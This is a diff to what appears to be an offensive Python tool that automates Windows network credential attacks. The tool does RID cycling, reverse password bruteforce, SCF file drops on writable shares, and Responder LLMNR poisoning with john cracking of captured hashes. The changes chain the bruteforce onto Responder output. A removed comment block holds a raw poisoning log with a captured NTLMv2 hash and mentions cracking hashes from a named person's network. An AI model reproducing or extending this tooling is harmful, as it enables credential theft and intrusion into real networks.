@@ -251,7 +251,7 @@ def coros_pool(worker_count, commands):
     if len(commands) > 0:
         while len(commands) > 0:
             for i in range(worker_count):
-                # Prevents crash if [commands] isn't divisible by 5
+                # Prevents crash if [commands] isn't divisible by worker count
                 if len(commands) > 0:
                     coros.append(get_output(commands.pop()))
                 else:
@@ -451,7 +451,7 @@ def parse_brute_output(brute_output):
                 log_pwds([dom_user_pwd])
 
     if pw_found == False:
-        print('[-] No password matches found')
+        print('[-] No reverse bruteforce password matches found')
 
     return prev_creds
 
@@ -802,7 +802,7 @@ def parse_mimikatz(prev_creds, mimi_data, line):
 
     return prev_creds, mimi_data
 
-def get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier):
+def get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier, passwords, loop):
     '''
     Gets and cracks responder hashes
     Avoids getting and cracking previous hashes
@@ -824,30 +824,35 @@ def get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier):
                 if line not in prev_lines:
                     new_lines.append(line)
                     line = line.strip()
-                    print('    [Responder] '+line
-                    ip = parse_responder_lines(client_found, line)
+                    print('    [Responder] '+line)
+                    ip = parse_responder_lines(line, ip, passwords, loop)
 
     # We don't want a separate john proc for each hash so we wait 10s between checks
     time.sleep(10)
 
     return prev_creds, new_lines
 
-def parse_responder(client_found, line):
+def parse_responder_lines(line, ip, passwords, loop):
     '''
     Parse responder to get usernames and IPs for 2 pw bruteforcing
     '''
     client_id = ' Client   : '
     username_id = ' Username : '
 
-    if client_found == True:
+    if ip:
         if username_id in line:
-            client_found = False
             username = line.split(username_id)[-1].strip()
-            # DO BRUTE HERE
-        else:
-            print('[-] Error parsing Responder-Session.log: why is client_found == True but this line is not " Username : "??')
+            ip_user = {ip:[username]}
+            ip = None
+            cmd = create_brute_cmds(ip_user, passwords)
+            brute_output = async_get_outputs(loop, cmd)
+            # Will always return at least an empty dict()
+            prev_creds = parse_brute_output(brute_output)
 
-    if client in line:
+        else:
+            print('[-] Error parsing Responder-Session.log: IP found in previous line this line is not " Username : xxx"')
+
+    if client_id in line:
         ip = line.split(client_id)[-1].strip()
 
     return ip
@@ -1054,7 +1059,7 @@ def main(report, args):
 
         # ATTACK 1: RID Cycling into reverse bruteforce
         if 'rid' not in args.skip.lower():
-            prev_creds += smb_reverse_brute(loop, hosts, args, passwords)
+            prev_creds = smb_reverse_brute(loop, hosts, args, passwords)
 
         # ATTACK 2: SCF file upload to writeable shares
         parse_nse(hosts, args)
@@ -1074,7 +1079,7 @@ def main(report, args):
         timeout = time.time() + 60 * int(args.respondertime)
         try:
             while time.time() < timeout:
-                prev_creds, new_lines = get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier)
+                prev_creds, new_lines = get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier, passwords, loop)
                 prev_lines += new_lines
             prev_creds = cleanup_resp(resp_proc, prev_creds)
         except KeyboardInterrupt:
@@ -1093,21 +1098,3 @@ if __name__ == "__main__":
         exit('[-] Run as root')
     report = parse_nmap(args)
     main(report, args)
-
-
-# WHERE I LEFT OFF
-    # TO DO
-    # why does john not crack the hashes responder captured on marcello's network; check phone pictures for paste
-
-#    # quick 2 password bruteforce on responder usernames
-#01/04/2018 10:36:46 PM - [*] [LLMNR]  Poisoned answer sent to 10.1.0.97 for name fdsfdsffdfffFDFDfdsafdfdf
-#01/04/2018 10:36:47 PM - [*] Skipping previously captured hash for LAB\dan.da
-#01/04/2018 10:36:47 PM - [*] Skipping previously captured hash for LAB\dan.da
-#01/04/2018 10:36:53 PM - [*] [LLMNR]  Poisoned answer sent to 10.1.0.97 for name fdsfdsffdfffFDFDfdsafdfdf
-#01/04/2018 10:36:55 PM - [SMBv2] NTLMv2-SSP Client   : 10.1.0.97
-#01/04/2018 10:36:55 PM - [SMBv2] NTLMv2-SSP Username : LAB\me
-#01/04/2018 10:36:55 PM - [SMBv2] NTLMv2-SSP Hash     : me::LAB:4408ea9ea58cb4fd:C4828263E213E1243EE286E5BBC0D981:0101000000000000C0653150DE09D20169FBA08A845E70F6000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000C64FC9FA1A1FBC490AF573DFAE78E3766AD131888F77120D8DDFD12A1530CA460A0010000000000000000000000000000000000009003C0063006900660073002F006600640073006600640073006600660064006600660066004600440046004400660064007300610066006400660064006600000000000000000000000000
-#01/04/2018 10:36:55 PM - [*] [LLMNR]  Poisoned answer sent to 10.1.0.97 for name fdsfdsffdffffdfdfdsafdfdf
-#
-
-    #  left off line 846
